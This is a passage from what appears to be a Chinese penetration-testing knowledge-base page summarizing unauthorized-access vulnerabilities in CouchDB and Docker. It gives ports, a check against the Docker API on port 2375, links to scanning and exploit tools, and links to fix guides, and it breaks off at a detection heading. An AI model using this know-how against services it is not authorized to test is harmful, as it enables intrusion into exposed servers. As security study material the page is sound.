<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透测试/WEB漏洞/未授权访问/未授权访问漏洞总结" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">未授权访问漏洞总结 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/渗透测试/WEB漏洞/未授权访问/未授权访问漏洞总结"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="未授权访问漏洞总结 | d4m1ts 知识库"><meta data-rh="true" name="description" content="什么是未授权访问漏洞"><meta data-rh="true" property="og:description" content="什么是未授权访问漏洞"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/未授权访问/未授权访问漏洞总结"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/未授权访问/未授权访问漏洞总结" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/未授权访问/未授权访问漏洞总结" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"渗透测试","item":"https://blog.gm7.org/docs/渗透测试/"},{"@type":"ListItem","position":2,"name":"WEB漏洞","item":"https://blog.gm7.org/docs/渗透测试/WEB漏洞/"},{"@type":"ListItem","position":3,"name":"未授权访问","item":"https://blog.gm7.org/docs/category/未授权访问"},{"@type":"ListItem","position":4,"name":"未授权访问漏洞总结","item":"https://blog.gm7.org/docs/渗透测试/WEB漏洞/未授权访问/未授权访问漏洞总结"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.933499b4.css">
<script src="/assets/js/runtime~main.fa890071.js" defer="defer"></script>
<script src="/assets/js/main.ef8e3068.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/渗透测试/">渗透测试</a><button aria-label="折叠侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/渗透测试/信息收集/资产收集/主域名收集/">信息收集</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/渗透测试/WEB漏洞/">WEB漏洞</a><button aria-label="折叠侧边栏分类 &#x27;WEB漏洞&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/">SQL注入</a><button aria-label="展开侧边栏分类 &#x27;SQL注入&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSS/">XSS</a><button aria-label="展开侧边栏分类 &#x27;XSS&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/csrf">CSRF</a><button aria-label="展开侧边栏分类 &#x27;CSRF&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/SSRF/">SSRF</a><button aria-label="展开侧边栏分类 &#x27;SSRF&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/未授权访问">未授权访问</a><button aria-label="折叠侧边栏分类 &#x27;未授权访问&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/渗透测试/WEB漏洞/未授权访问/未授权访问漏洞总结">未授权访问漏洞总结</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/未授权访问/Redis未授权访问漏洞利用">Redis未授权访问漏洞利用</a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/条件竞争/">条件竞争</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/任意文件下载:读取/">任意文件下载/读取</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/文件上传/">文件上传</a><button aria-label="展开侧边栏分类 &#x27;文件上传&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/文件包含漏洞/">文件包含漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/LDAP注入/">LDAP注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XXE/">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/命令执行/">命令执行</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/代码注入/">代码注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SAML测试/">SAML测试</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/JSONP数据劫持/">JSONP数据劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CORS跨域数据劫持/">CORS跨域数据劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CSV注入/">CSV注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSSI/">XSSI</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSLT/">XSLT</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XS-Leaks/">XS-Leaks</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SSTI注入/">SSTI</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/GraphQL测试/">GraphQL安全测试</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/子域名接管/">子域名接管</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/列目录漏洞/">列目录漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XPATH注入/">XPATH注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/越权漏洞/">越权漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/不安全的反序列化/">不安全的反序列化</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/任意URL跳转/">任意URL跳转</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/信息泄漏/">信息泄漏漏洞</a><button aria-label="展开侧边栏分类 &#x27;信息泄漏漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SMTP注入/">SMTP注入</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/逻辑漏洞/">逻辑漏洞</a><button aria-label="展开侧边栏分类 &#x27;逻辑漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CRLF注入/">CRLF注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/web缓存投毒/">WEB缓存投毒</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/漏洞扫描工具/">漏洞扫描工具</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/思路技巧">思路技巧</a><button aria-label="展开侧边栏分类 &#x27;思路技巧&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/权限维持/">权限维持</a><button aria-label="展开侧边栏分类 &#x27;权限维持&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/小程序测试">小程序测试</a><button aria-label="展开侧边栏分类 &#x27;小程序测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/保护自己">保护自己</a><button aria-label="展开侧边栏分类 &#x27;保护自己&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/waf绕过">WAF绕过</a><button aria-label="展开侧边栏分类 &#x27;WAF绕过&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/攻防演练/">攻防演练</a><button aria-label="展开侧边栏分类 &#x27;攻防演练&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/社工钓鱼/">社工钓鱼</a><button aria-label="展开侧边栏分类 &#x27;社工钓鱼&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/cs">C2</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/powershell">免杀</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/内网基础知识">内网渗透</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/基础知识扫盲">基础知识扫盲</a><button aria-label="展开侧边栏分类 &#x27;基础知识扫盲&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/代码审计/">代码审计</a><button aria-label="展开侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/日常使用">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/"><span>渗透测试</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/WEB漏洞/"><span>WEB漏洞</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/未授权访问"><span>未授权访问</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">未授权访问漏洞总结</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>未授权访问漏洞总结</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="什么是未授权访问漏洞">什么是未授权访问漏洞<a href="#什么是未授权访问漏洞" class="hash-link" aria-label="什么是未授权访问漏洞的直接链接" title="什么是未授权访问漏洞的直接链接">​</a></h2>
<p>未授权访问，顾名思义就是不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证存在缺陷、无认证或安全配置不当导致。常见于服务端口，接口未限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="couchdb">CouchDB<a href="#couchdb" class="hash-link" aria-label="CouchDB的直接链接" title="CouchDB的直接链接">​</a></h2>
<ul>
<li>端口：web端口</li>
<li>介绍：利用该未授权访问漏洞不仅会造成数据的丢失和泄露，<code>甚至可执行任意系统命令</code>。</li>
<li>使用工具：<!-- -->
<ul>
<li><a href="https://github.com/cwkiller/unauthorized-check" target="_blank" rel="noopener noreferrer">https://github.com/cwkiller/unauthorized-check</a></li>
</ul>
</li>
<li>修复：<a href="https://cloud.tencent.com/developer/article/1624462" target="_blank" rel="noopener noreferrer">参考 CouchDB未授权访问漏洞修复方案</a></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="docker">Docker<a href="#docker" class="hash-link" aria-label="Docker的直接链接" title="Docker的直接链接">​</a></h2>
<ul>
<li>端口：2375</li>
<li>介绍：通过访问ip:2375/version验证，有可能造成执行目标服务器容器命令如container、image等</li>
<li>使用工具：<!-- -->
<ul>
<li><a href="https://github.com/Tycx2ry/docker_api_vul" target="_blank" rel="noopener noreferrer">https://github.com/Tycx2ry/docker_api_vul</a></li>
<li><a href="https://github.com/cwkiller/unauthorized-check" target="_blank" rel="noopener noreferrer">https://github.com/cwkiller/unauthorized-check</a></li>
<li><a href="https://github.com/netxfly/docker-remote-api-exp" target="_blank" rel="noopener noreferrer">https://github.com/netxfly/docker-remote-api-exp</a></li>
</ul>
</li>
<li>修复：参考 <a href="https://cloud.tencent.com/developer/article/1744943" target="_blank" rel="noopener noreferrer">【漏洞修复】Docker remote api未授权访问复现和修复</a></li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞信息">漏洞信息<a href="#漏洞信息" class="hash-link" aria-label="漏洞信息的直接链接" title="漏洞信息的直接链接">​</a></h3>
<p>(1) 漏洞简述Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker 存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以脱离容器拿到宿主机权限。</p>
<p>(2) 风险等级高风险。</p>
<p>(3) 漏洞编号无。</p>
<p>(4) 影响范围Docker 1.3、Docker 1.6。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="检测方法">检测方法<a href="#检测方法" class="hash-link" aria-label="检测方法的直接链接" title="检测方法的直接链接">​</a></h3>
